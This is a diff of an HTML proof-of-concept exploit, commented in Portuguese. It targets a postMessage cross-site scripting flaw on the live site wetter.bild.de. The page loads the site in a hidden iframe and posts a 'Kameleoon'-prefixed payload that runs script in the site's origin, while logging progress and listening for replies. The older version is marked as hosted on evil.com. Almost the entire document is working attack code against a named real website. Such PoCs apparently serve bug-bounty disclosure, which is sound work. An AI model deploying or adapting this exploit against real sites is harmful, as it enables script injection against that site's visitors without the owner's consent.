@@ -1,20 +1,40 @@
-<!-- exploit.html (hospedado em https://evil.com) -->
 <!DOCTYPE html>
 <html>
-  <body>
-    <h1>Exploit PoC</h1>
-    <iframe
-      src="https://wetter.bild.de"
-      id="target"
-      style="width:0;height:0;border:0;display:none"
-    ></iframe>
+<head>
+  <meta charset="UTF-8">
+  <title>PostMessage XSS PoC</title>
+</head>
+<body>
+  <h1>💣 PostMessage Exploit PoC</h1>
+  <p id="status">⏳ Enviando payload para <strong>wetter.bild.de</strong>...</p>
 
-    <script>
-      const iframe = document.getElementById("target");
-      iframe.onload = () => {
-        // envia a mensagem com origem verdadeira de evil.com
-        iframe.contentWindow.postMessage("Kameleoonalert(document.domain)", "https://wetter.bild.de");
-      };
-    </script>
-  </body>
+  <iframe
+    src="https://wetter.bild.de"
+    id="target"
+    style="width:0;height:0;border:0;display:none"
+  ></iframe>
+
+  <script>
+    const iframe = document.getElementById("target");
+
+    // payload real
+    const payload = 'Kameleoonalert(`XSS por postMessage: ${document.origin}`)';
+
+    iframe.onload = () => {
+      try {
+        console.log("[>] Enviando payload...");
+        iframe.contentWindow.postMessage(payload, "https://wetter.bild.de");
+        document.getElementById("status").innerText = "✅ Payload enviado. Aguarde o alerta.";
+      } catch (e) {
+        console.error("Erro ao enviar postMessage:", e);
+        document.getElementById("status").innerText = "❌ Erro ao enviar postMessage";
+      }
+    };
+
+    // opcional: detectar se o payload rodou (se você adicionar código extra na vítima)
+    window.addEventListener("message", function(event) {
+      console.log("[<] Mensagem recebida de volta:", event.data);
+    });
+  </script>
+</body>
 </html>
